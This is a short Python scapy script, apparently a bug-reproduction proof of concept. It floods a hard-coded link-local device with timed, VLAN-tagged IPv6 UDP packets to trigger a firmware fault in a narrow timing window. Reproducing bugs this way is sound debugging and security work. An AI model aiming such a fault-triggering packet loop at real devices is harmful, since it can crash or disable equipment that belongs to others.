''' Sends packets to trigger the fault condition.

    Note that if firmware changes, the packet size may need to change as well;
    it's hitting a very small timing window!
'''
from scapy.all import *

# Hard-coded in `hardcoded_mac_address`
mac = "0e:1d:9a:64:b8:c2"
ip = "fe80::c1d:9aff:fe64:b8c2"

consecutive_failures = 0
pad = 46 # found using sweep.py

while True:
    base = Ether(dst=mac) / IPv6(dst=ip) / UDP(dport=7777, sport=2000)
    start = base / "1 hello, world"

    outer = Dot1Q(vlan=0x301, prio=0)
    poison = Ether(dst=mac) / outer / IPv6(dst=ip) / UDP(dport=7777, sport=2000)
    packets = []
    for i in range(1, 6):
        data = f"data-{i}" + '0' * pad
        packets.append(poison / data)

    sendp(start) # slow packet
    time.sleep(0.05)
    sendp(packets)
    time.sleep(0.25)
